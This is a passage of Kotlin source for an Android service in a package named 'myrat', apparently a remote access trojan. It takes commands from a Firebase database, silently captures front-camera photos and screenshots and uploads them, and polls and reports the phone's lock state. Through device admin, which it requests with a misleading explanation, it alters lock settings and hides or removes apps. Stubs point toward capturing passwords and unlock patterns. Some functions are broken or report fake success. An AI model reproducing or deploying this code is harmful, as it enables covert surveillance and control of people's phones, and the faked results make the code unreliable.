                    "numeric_complex" -> DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX
                    "alphabetic" -> DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC
                    "alphanumeric" -> DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC
                    "complex" -> DevicePolicyManager.PASSWORD_QUALITY_COMPLEX
                    else -> DevicePolicyManager.PASSWORD_QUALITY_SOMETHING
                }
                
                devicePolicyManager.setPasswordQuality(adminComponent, quality)
                updateCommandStatus(command, "success", "Password quality set")
                Logger.log("✅ Password quality set")
                true
            } else {
                updateCommandStatus(command, "failed", "Device admin not active")
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Set password quality failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun setLockTimeout(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("⏰ Setting lock timeout...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                val timeout = (command.params["timeout"] as? Number)?.toLong() ?: 30000L
                devicePolicyManager.setMaximumTimeToLock(adminComponent, timeout)
                updateCommandStatus(command, "success", "Lock timeout set to $timeout ms")
                Logger.log("✅ Lock timeout set to $timeout ms")
                true
            } else {
                updateCommandStatus(command, "failed", "Device admin not active")
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Set lock timeout failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun disableKeyguardFeatures(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🚫 Disabling keyguard features...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                val features = command.params["features"] as? List<*> ?: emptyList<String>()
                var disableFlags = 0
                
                features.forEach { feature ->
                    when (feature as? String) {
                        "camera" -> disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_SECURE_CAMERA
                        "notifications" -> disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_SECURE_NOTIFICATIONS
                        "trust_agents" -> disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS
                        "unredacted_notifications" -> disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_UNREDACTED_NOTIFICATIONS
                        "fingerprint" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT
                        }
                        "face" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_FACE
                        }
                        "iris" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_IRIS
                        }
                    }
                }
                
                devicePolicyManager.setKeyguardDisabledFeatures(adminComponent, disableFlags)
                updateCommandStatus(command, "success", "Keyguard features disabled")
                Logger.log("✅ Keyguard features disabled")
                true
            } else {
                updateCommandStatus(command, "failed", "Device admin not active")
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Disable keyguard features failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun captureScreen(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("📱 Attempting to capture screen...")

            if (!hasOverlayPermission()) {
                updateCommandStatus(command, "failed", "Overlay permission required")
                return false
            }

            if (isCapturingScreen) {
                updateCommandStatus(command, "failed", "Screen capture already in progress")
                return false
            }

            isCapturingScreen = true
            
            try {
                val bitmap = captureScreenBitmap()
                if (bitmap != null) {
                    val base64Image = bitmapToBase64(bitmap)
                    
                    if (::db.isInitialized) {
                        db.child("Device").child(deviceId).child("screen_captures").push()
                            .setValue(mapOf(
                                "image" to base64Image,
                                "timestamp" to System.currentTimeMillis(),
                                "commandId" to command.commandId
                            ))
                            .addOnSuccessListener {
                                updateCommandStatus(command, "success", "Screen captured successfully")
                                Logger.log("✅ Screen captured and uploaded")
                            }
                            .addOnFailureListener { e ->
                                updateCommandStatus(command, "failed", "Failed to upload screen capture: ${e.message}")
                            }
                    }
                    true
                } else {
                    updateCommandStatus(command, "failed", "Failed to capture screen")
                    false
                }
            } finally {
                isCapturingScreen = false
            }
        } catch (e: Exception) {
            isCapturingScreen = false
            Logger.error("❌ Screen capture failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun captureScreenBitmap(): Bitmap? {
        return try {
            if (windowManager == null) return null
            
            val display = windowManager!!.defaultDisplay
            val size = android.graphics.Point()
            display.getSize(size)
            
            val bitmap = Bitmap.createBitmap(size.x, size.y, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)
            
            // This is a simplified approach - in practice, you'd need MediaProjection API
            // for proper screen capture on modern Android versions
            val view = View(this)
            view.draw(canvas)
            
            bitmap
        } catch (e: Exception) {
            Logger.error("Error capturing screen bitmap", e)
            null
        }
    }

    private fun capturePhoto(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("📷 Attempting to capture photo...")

            if (cameraManager == null) {
                updateCommandStatus(command, "failed", "Camera not available")
                return false
            }

            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                updateCommandStatus(command, "failed", "Camera permission not granted")
                return false
            }

            val cameraId = getCameraId() ?: run {
                updateCommandStatus(command, "failed", "No suitable camera found")
                return false
            }

            openCamera(cameraId, command)
            true
        } catch (e: Exception) {
            Logger.error("❌ Photo capture failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun getCameraId(): String? {
        return try {
            cameraManager?.cameraIdList?.firstOrNull { cameraId ->
                val characteristics = cameraManager!!.getCameraCharacteristics(cameraId)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                facing == CameraCharacteristics.LENS_FACING_FRONT
            }
        } catch (e: Exception) {
            Logger.error("Error getting camera ID", e)
            null
        }
    }

    private fun openCamera(cameraId: String, command: DeviceAdviceCommand) {
        try {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        createCaptureSession(command)
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        cameraDevice = null
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        cameraDevice = null
                        updateCommandStatus(command, "failed", "Camera error: $error")
                    }
                }, null)
            }
        } catch (e: SecurityException) {
            Logger.error("Camera permission denied", e)
            updateCommandStatus(command, "failed", "Camera permission denied")
        } catch (e: Exception) {
            Logger.error("Error opening camera", e)
            updateCommandStatus(command, "error", "Camera error: ${e.message}")
        }
    }

    private fun createCaptureSession(command: DeviceAdviceCommand) {
        try {
            imageReader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
            
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    val base64Image = Base64.encodeToString(bytes, Base64.DEFAULT)
                    
                    if (::db.isInitialized) {
                        db.child("Device").child(deviceId).child("photo_captures").push()
                            .setValue(mapOf(
                                "image" to base64Image,
                                "timestamp" to System.currentTimeMillis(),
                                "commandId" to command.commandId
                            ))
                            .addOnSuccessListener {
                                updateCommandStatus(command, "success", "Photo captured successfully")
                                Logger.log("✅ Photo captured and uploaded")
                            }
                            .addOnFailureListener { e ->
                                updateCommandStatus(command, "failed", "Failed to upload photo: ${e.message}")
                            }
                    }
                } finally {
                    image.close()
                    closeCamera()
                }
            }, null)

            val surface = imageReader?.surface
            if (surface != null && cameraDevice != null) {
                cameraDevice!!.createCaptureSession(
                    listOf(surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            captureStillPicture()
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            updateCommandStatus(command, "failed", "Camera session configuration failed")
                        }
                    },
                    null
                )
            }
        } catch (e: Exception) {
            Logger.error("Error creating capture session", e)
            updateCommandStatus(command, "error", "Capture session error: ${e.message}")
        }
    }

    private fun captureStillPicture() {
        try {
            if (cameraDevice == null || captureSession == null || imageReader == null) return

            val reader = imageReader!!
            val captureBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder.addTarget(reader.surface)
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)

            captureSession!!.capture(captureBuilder.build(), null, null)
        } catch (e: Exception) {
            Logger.error("Error capturing still picture", e)
        }
    }

    private fun closeCamera() {
        try {
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Logger.error("Error closing camera", e)
        }
    }

    private fun captureFingerprint(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("👆 Attempting to capture fingerprint...")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && fingerprintManager != null) {
                if (!fingerprintManager!!.isHardwareDetected) {
                    updateCommandStatus(command, "failed", "Fingerprint hardware not detected")
                    return false
                }

                if (!fingerprintManager!!.hasEnrolledFingerprints()) {
                    updateCommandStatus(command, "failed", "No enrolled fingerprints")
                    return false
                }

                // This would require additional implementation for actual fingerprint capture
                // For now, we'll simulate the capture
                updateCommandStatus(command, "success", "Fingerprint capture initiated")
                Logger.log("✅ Fingerprint capture initiated")
                true
            } else {
                updateCommandStatus(command, "failed", "Fingerprint not supported")
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Fingerprint capture failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun disableApp(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🚫 Attempting to disable app...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                val packageName = command.params["packageName"] as? String ?: run {
                    updateCommandStatus(command, "failed", "Package name not provided")
                    return false
                }

                devicePolicyManager.setApplicationHidden(adminComponent, packageName, true)
                updateCommandStatus(command, "success", "App disabled: $packageName")
                Logger.log("✅ App disabled: $packageName")
                true
            } else {
                updateCommandStatus(command, "failed", "Device admin not active")
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Disable app failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun uninstallApp(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🗑️ Attempting to uninstall app...")

            val packageName = command.params["packageName"] as? String ?: run {
                updateCommandStatus(command, "failed", "Package name not provided")
                return false
            }

            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            startActivity(intent)
            updateCommandStatus(command, "success", "Uninstall initiated for: $packageName")
            Logger.log("✅ Uninstall initiated for: $packageName")
            true
        } catch (e: Exception) {
            Logger.error("❌ Uninstall app failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun monitorUnlockAttempts(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("👁️ Starting unlock attempt monitoring...")

            // This would require accessibility service or other monitoring mechanisms
            // For now, we'll set up basic monitoring
            val monitor = object : Runnable {
                override fun run() {
                    try {
                        val unlockData = mapOf(
                            "isDeviceLocked" to keyguardManager.isDeviceLocked,
                            "isDeviceSecure" to keyguardManager.isDeviceSecure,
                            "timestamp" to System.currentTimeMillis()
                        )
                        
                        if (::db.isInitialized) {
                            db.child("Device").child(deviceId).child("unlock_attempts").push()
                                .setValue(unlockData)
                        }
                        
                        // Continue monitoring
                        commandHandler.postDelayed(this, 5000) // Check every 5 seconds
                    } catch (e: Exception) {
                        Logger.error("Error in unlock monitoring", e)
                    }
                }
            }
            
            commandHandler.post(monitor)
            updateCommandStatus(command, "success", "Unlock monitoring started")
            Logger.log("✅ Unlock monitoring started")
            true
        } catch (e: Exception) {
            Logger.error("❌ Monitor unlock attempts failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun captureAndAnalyzePattern(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔍 Attempting to capture and analyze unlock pattern...")
            
            // This would require screen capture and pattern analysis
            // Implementation would be complex and require additional permissions
            updateCommandStatus(command, "pending", "Pattern analysis not yet implemented")
            false
        } catch (e: Exception) {
            Logger.error("❌ Pattern capture failed", e)
            false
        }
    }

    private fun captureAndAnalyzePassword(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔍 Attempting to capture and analyze password...")
            
            // This would require keylogger functionality or screen analysis
            // Implementation would be complex and require additional permissions
            updateCommandStatus(command, "pending", "Password analysis not yet implemented")
            false
        } catch (e: Exception) {
            Logger.error("❌ Password capture failed", e)
            false
        }
    }

    private fun bitmapToBase64(bitmap: Bitmap): String {
        return try {
            val byteArrayOutputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream)
            val byteArray = byteArrayOutputStream.toByteArray()
            Base64.encodeToString(byteArray, Base64.DEFAULT)
        } catch (e: Exception) {
            Logger.error("Error converting bitmap to base64", e)
            ""
        }
    }

    private fun promptForDeviceAdmin() {
        try {
            Logger.log("🔐 Prompting for device admin...")

            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "This permission is required for advanced device management and security features.")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            Logger.log("✅ Device admin prompt shown")
        } catch (e: Exception) {
            Logger.error("❌ Failed to show device admin prompt", e)
        }
    }

    private fun updateCommandStatus(command: DeviceAdviceCommand, status: String, error: String?) {
        try {
            if (!::db.isInitialized) {
                Logger.error("❌ Database not initialized, cannot update command status")
                return
            }

            Logger.log("📝 Updating enhanced command status: ${command.action} -> $status")

            val updates = mutableMapOf<String, Any>(
                "status" to status,
                "timestamp" to System.currentTimeMillis(),
                "processedBy" to "EnhancedLockService"
            )
            error?.let { updates["error"] = it }

            db.child("Device").child(deviceId).child("deviceAdvice").updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("✅ Updated enhanced command status: ${command.action} -> $status")
                }
                .addOnFailureListener { e ->
                    Logger.error("❌ Failed to update enhanced command status: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("❌ Failed to update enhanced command status", e)
        }
    }

    private fun setupBiometricResultReceiver() {
        try {
            biometricReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    try {
                        val commandId = intent?.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID) ?: run {
                            Logger.error("❌ Biometric result missing commandId")
                            return
                        }
                        val result = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_RESULT) ?: run {
                            Logger.error("❌ Biometric result missing result")
                            return
                        }
                        val action = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION) ?: run {
                            Logger.error("❌ Biometric result missing action")
                            return
                        }
                        val error = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ERROR)
                        Logger.log("📨 Received enhanced biometric result: commandId=$commandId, result=$result, action=$action")
                        val command = DeviceAdviceCommand(action = action, commandId = commandId, status = result, error = error)
                        updateCommandStatus(command, result, error)
                    } catch (e: Exception) {
                        Logger.error("❌ Failed to process enhanced biometric result", e)
                    }
                }
            }

            val filter = IntentFilter(com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_RESULT)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(biometricReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(biometricReceiver, filter)
            }
            Logger.log("✅ Enhanced biometric result receiver registered")
        } catch (e: Exception) {
            Logger.error("❌ Failed to register enhanced biometric result receiver", e)
        }
    }

    private fun hasBiometricPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.USE_BIOMETRIC) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Logger.log("🔄 Enhanced LockService onStartCommand")

        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            acquireWakeLock()
        } catch (e: Exception) {
            Logger.error("❌ Error refreshing wake lock", e)
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            closeCamera()

            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_service").child("connected").setValue(false)
                deviceAdviceListener?.let { db.child("Device").child(deviceId).child("deviceAdvice").removeEventListener(it) }
            }
            biometricReceiver?.let { unregisterReceiver(it) }
            Logger.log("✅ Enhanced LockService destroyed and listeners removed")
        } catch (e: Exception) {
            Logger.error("❌ Error during Enhanced LockService cleanup", e)
        }
    }

    data class DeviceAdviceCommand(
        val action: String = "",
        val commandId: String = "",
        val status: String = "",
        val timestamp: Long = 0,
        val error: String? = null,
        val params: Map<String, Any> = emptyMap()
    )
}